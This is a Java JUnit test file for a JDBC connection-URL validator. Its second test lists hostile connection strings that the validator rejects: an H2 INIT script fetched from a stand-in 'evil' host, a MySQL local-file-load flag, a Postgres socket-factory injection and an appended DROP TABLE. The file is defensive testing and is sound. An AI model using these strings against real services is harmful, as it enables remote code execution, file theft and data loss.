package io.matedata;

import static org.assertj.core.api.Assertions.*;

import io.matedata.catalog.domain.ConnectionPolicy;
import org.junit.jupiter.api.Test;

class SecurityPolicyTest {
  @Test
  void acceptsExplicitPostgresAndMysqlHosts() {
    assertThatCode(
            () ->
                ConnectionPolicy.validate(
                    "POSTGRESQL", "jdbc:postgresql://localhost:5432/analytics"))
        .doesNotThrowAnyException();
    assertThatCode(
            () -> ConnectionPolicy.validate("MYSQL", "jdbc:mysql://db.internal:3306/analytics"))
        .doesNotThrowAnyException();
  }

  @Test
  void rejectsDriverInjectionAndLocalFiles() {
    for (String url :
        new String[] {
          "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://evil'",
          "jdbc:mysql://db/x?allowLoadLocalInfile=true",
          "jdbc:postgresql://db/x?socketFactory=evil",
          "jdbc:mysql://db/x;DROP TABLE x"
        })
      assertThatThrownBy(() -> ConnectionPolicy.validate("MYSQL", url))
          .isInstanceOf(IllegalArgumentException.class);
  }
}
